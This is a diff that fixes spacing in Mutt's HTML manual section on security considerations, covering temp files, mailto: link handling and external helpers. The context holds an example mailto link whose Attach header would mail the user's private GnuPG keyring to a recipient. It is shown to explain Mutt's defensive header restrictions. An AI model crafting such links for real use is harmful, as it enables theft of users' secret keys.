@@ -35,7 +35,7 @@ title: Security Considerations
       </div>
     </div>
     <p>Mutt uses many temporary files for viewing messages, verifying digital signatures, etc. As long as being used, these files are visible by other users and maybe even readable in case of misconfiguration. Also, a different location for these files may be desired which can be changed via the
-    <a class="link" href="reference.html#tmpdir" title="3.383.&#160;tmpdir">$tmpdir</a>variable.</p>
+    <a class="link" href="reference.html#tmpdir" title="3.383.&#160;tmpdir">$tmpdir</a> variable.</p>
   </div>
   <div class="sect1">
     <div class="titlepage">
@@ -73,7 +73,7 @@ title: Security Considerations
       <p>As Mutt be can be set up to be the mail client to handle
       <code class="literal">mailto:</code>style links in websites, there're security considerations, too. Arbitrary header fields can be embedded in these links which could override existing header fields or attach arbitrary files using
       <a class="link" href="gettingstarted.html#attach-header" title="6.2.2.&#160;Attach: Pseudo Header">the Attach: pseudoheader</a>. This may be problematic if the
-      <a class="link" href="reference.html#edit-headers" title="3.68.&#160;edit_headers">$edit-headers</a>variable is
+      <a class="link" href="reference.html#edit-headers" title="3.68.&#160;edit_headers">$edit-headers</a> variable is
       <span class="emphasis">
         <em>unset</em>
       </span>, i.e. the user doesn't want to see header fields while editing the message and doesn't pay enough attention to the compose menu's listing of attachments.</p>
@@ -82,10 +82,10 @@ title: Security Considerations
 mailto:joe@host?Attach=~/.gnupg/secring.gpg
 </pre>
       <p>will send out the user's private gnupg keyring to
-      <code class="literal">joe@host</code>if the user doesn't follow the information on screen carefully enough.</p>
+      <code class="literal">joe@host</code> if the user doesn't follow the information on screen carefully enough.</p>
       <p>To prevent these issues, Mutt by default only accepts the
-      <code class="literal">Subject</code>and
-      <code class="literal">Body</code>headers. Allowed headers can be adjusted with the
+      <code class="literal">Subject</code> and
+      <code class="literal">Body</code> headers. Allowed headers can be adjusted with the
       <a class="link" href="configuration.html#mailto-allow" title="30.&#160;Control allowed header fields in a mailto: URL">
         <span class="command">
           <strong>mailto_allow</strong>
@@ -109,7 +109,7 @@ mailto:joe@host?Attach=~/.gnupg/secring.gpg
     </div>
     <p>Mutt in many places has to rely on external applications or for convenience supports mechanisms involving external applications.</p>
     <p>One of these is the
-    <code class="literal">mailcap</code>mechanism as defined by RfC1524. Details about a secure use of the mailcap mechanisms is given in
+    <code class="literal">mailcap</code> mechanism as defined by RfC1524. Details about a secure use of the mailcap mechanisms is given in
     <a class="xref" href="mimesupport.html#secure-mailcap" title="3.2.&#160;Secure Use of Mailcap">Section&#160;3.2, “Secure Use of Mailcap”</a>.</p>
     <p>Besides the mailcap mechanism, Mutt uses a number of other external utilities for operation, for example to provide crypto support, in backtick expansion in configuration files or format string filters. The same security considerations apply for these as for tools involved via mailcap.</p>
   </div>
